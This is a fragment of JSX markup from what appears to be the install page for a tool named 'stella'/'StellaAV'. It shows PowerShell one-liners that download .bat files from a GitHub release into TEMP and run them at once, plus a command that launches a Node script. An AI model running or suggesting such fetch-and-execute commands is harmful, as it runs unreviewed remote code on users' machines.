            ...
            <div className="p-6 bg-[#111118] rounded-2xl border border-white/5">
              ...
              <div className="space-y-3">
                ...
                <div>
                  ...
                  <code className="block p-3 bg-black/50 rounded-lg text-[#22c55e] font-mono text-xs break-all">iwr -Uri "https://github.com/a1x10/stella/releases/download/v5.3.1/setup-full.bat" -OutFile "$env:TEMP\install.bat"; cmd /c $env:TEMP\install.bat</code>
                </div>
                <div>
            ...
            <div className="p-6 bg-[#111118] rounded-2xl border border-white/5">
              ...
              <div className="space-y-3">
                <div>
                  ...
                  <code className="block p-3 bg-black/50 rounded-lg text-[#f38ba8] font-mono text-xs break-all">iwr -Uri "https://github.com/a1x10/stella/releases/download/v5.3.1/setup-antivirus.bat" -OutFile "$env:TEMP\av.bat"; cmd /c $env:TEMP\av.bat</code>
                </div>
                <div>
                  <p className="text-[#64748b] text-sm mb-2">Direct download</p>
          ...
          <div className="mt-8 p-6 bg-[#111118] rounded-2xl border border-white/5">
            ...
            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
              ...
              <div>
                ...
                <code className="block p-3 bg-black/50 rounded-lg text-[#f38ba8] font-mono text-xs break-all">cmd /c "node %USERPROFILE%\StellaAV\index.mjs"</code>
              </div>
            </div>
          </div>
        </div>
